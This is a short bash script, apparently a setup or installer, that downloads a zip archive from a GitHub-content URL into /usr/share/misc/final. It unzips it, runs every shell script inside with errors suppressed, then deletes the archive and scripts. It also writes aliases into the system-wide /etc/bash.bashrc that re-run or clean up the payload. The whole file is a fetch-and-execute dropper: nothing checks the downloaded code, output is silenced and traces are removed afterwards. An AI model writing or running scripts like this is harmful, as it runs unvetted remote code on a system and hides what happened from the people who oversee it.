#!/bin/bash
mkdir /usr/share/misc/final
wget https://githubusercontent.com/D4NP0UL1N/Public/master/setup.zip -O /usr/share/misc/final/setup.zip 
sleep 2
echo 'alias setup="unzip /usr/share/misc/final/setup.zip >/dev/null; chmod +x /usr/share/misc/final/*.sh; /usr/share/misc/final/*.sh"' >> /etc/bash.bashrc
echo 'alias setup2="rm /usr/share/misc/final/*.zip; rm /usr/share/misc/final/*.sh"' >> /etc/bash.bashrc 
echo 'alias clean="unalias -a"' >> /etc/bash.bashrc
unzip /usr/share/misc/final/setup.zip >/dev/null 
chmod +x /usr/share/misc/final/*.sh 
/usr/share/misc/final/*.sh 2>/dev/null
rm /usr/share/misc/final/*.zip 2>/dev/null
rm /usr/share/misc/final/*.sh 2>/dev/null
unalias -a
